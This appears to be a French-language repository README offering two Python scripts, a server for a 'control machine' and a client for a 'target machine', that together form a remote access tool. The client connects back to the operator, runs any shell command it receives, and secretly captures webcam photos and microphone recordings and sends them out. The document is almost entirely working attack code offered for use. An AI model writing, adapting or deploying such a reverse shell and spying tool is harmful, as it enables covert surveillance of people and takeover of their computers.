# webcam_mic_control
webcam and microphone controls

🖥️ server.py – à exécuter sur la machine de contrôle
```python
import socket

host = '0.0.0.0'
port = 9999

server = socket.socket()
server.bind((host, port))
server.listen(1)
print(f"[+] En attente de connexion sur {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connecté à {addr}")

while True:
    cmd = input("Commande : ")
    if cmd.lower() in ['exit', 'quit']:
        conn.send(cmd.encode())
        break

    conn.send(cmd.encode())

    if cmd.lower() in ["screenshot", "webcam", "mic"]:
        size = int(conn.recv(1024).decode())
        conn.send(b"ACK")
        data = b''
        while len(data) < size:
            packet = conn.recv(4096)
            if not packet:
                break
            data += packet

        filename = {
            "screenshot": "received_screenshot.png",
            "webcam": "received_webcam.jpg",
            "mic": "received_audio.wav"
        }[cmd.lower()]

        with open(filename, "wb") as f:
            f.write(data)

        print(f"[+] {filename} reçu.")
        continue

    output = conn.recv(4096).decode()
    print(output)

conn.close()
```
💻 client.py – à exécuter sur la machine cible
```python
import socket
import subprocess
import cv2
import sounddevice as sd
from scipy.io.wavfile import write

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if ret:
        cv2.imwrite("webcam.jpg", frame)
        return True
    return False

def record_audio(filename="audio.wav", duration=5, samplerate=44100):
    audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=2)
    sd.wait()
    write(filename, samplerate, audio)

host = 'IP_DU_SERVEUR'  # ⬅️ Remplace ici par l'IP réelle de la machine serveur
port = 9999

client = socket.socket()
client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() in ['exit', 'quit']:
        break

    elif cmd.lower() == "webcam":
        if capture_webcam():
            with open("webcam.jpg", "rb") as f:
                data = f.read()
                client.send(str(len(data)).encode())
                ack = client.recv(1024)
                client.sendall(data)
        else:
            client.send(b"0")  # échec webcam

    elif cmd.lower() == "mic":
        record_audio()
        with open("audio.wav", "rb") as f:
            data = f.read()
            client.send(str(len(data)).encode())
            ack = client.recv(1024)
            client.sendall(data)

    else:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        client.send(output)

client.close()
```
## Les commandes shell 

* webcam → photo via webcam (en .jpg)
* mic → enregistrement audio (5 sec, .wav)
* exit ou quit → termine la session
